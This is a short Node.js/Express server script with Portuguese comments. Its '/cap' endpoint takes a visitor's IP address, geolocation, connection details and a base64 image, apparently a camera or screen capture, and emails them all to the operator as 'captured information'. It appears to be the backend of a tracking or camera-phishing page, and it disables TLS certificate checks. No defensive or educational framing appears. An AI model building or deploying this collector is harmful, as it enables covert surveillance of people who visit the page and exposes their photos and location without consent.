require("dotenv").config();
const express = require("express");
const nodemailer = require("nodemailer");
const requestIp = require("request-ip");

const app = express();
const PORT = process.env.PORT || 3000;

app.use(express.json({ limit: "10mb" }));
app.use(express.static("public"));

// Configuração do Nodemailer
const transporter = nodemailer.createTransport({
  service: "gmail",
  auth: {
    user: process.env.EMAIL_USER, // Pegando do .env
    pass: process.env.EMAIL_PASS, // Pegando do .env
  },
  tls: {
    rejectUnauthorized: false,
  },
});

// Função para enviar e-mail
function sendEmail(ip, location, connection, imageBuffer) {
  const mailOptions = {
    from: process.env.EMAIL_USER,
    to: process.env.EMAIL_USER,
    subject: "Informações Capturadas - Endpoint /cap",
    text: `Informações Capturadas:\nIP: ${ip}\nLocalização: ${location?.latitude}, ${location?.longitude}\nConexão: ${connection?.effectiveType}, ${connection?.downlink}Mbps, RTT: ${connection?.rtt}ms`,
    attachments: imageBuffer
      ? [
          {
            filename: `${Date.now()}.png`,
            content: imageBuffer,
            encoding: "base64",
          },
        ]
      : [],
  };

  transporter.sendMail(mailOptions, (error, info) => {
    if (error) {
      console.log("Erro ao enviar e-mail:", error);
    } else {
      console.log("E-mail enviado:", info.response);
    }
  });
}

// Endpoint /cap
app.post("/cap", (req, res) => {
  const ip = requestIp.getClientIp(req);
  const { image, location, connection } = req.body;

  console.log(`IP: ${ip}`);
  if (location) {
    console.log(`Localização: Latitude ${location.latitude}, Longitude ${location.longitude}`);
  }
  if (connection) {
    console.log(`Conexão: Tipo ${connection.effectiveType}, Downlink ${connection.downlink}, RTT ${connection.rtt}`);
  }

  const imageBuffer = image ? Buffer.from(image.split(",")[1], "base64") : null;
  sendEmail(ip, location, connection, imageBuffer);

  res.send({ status: "success", ip });
});

app.listen(PORT, () => console.log(`Servidor rodando em http://localhost:${PORT}`));
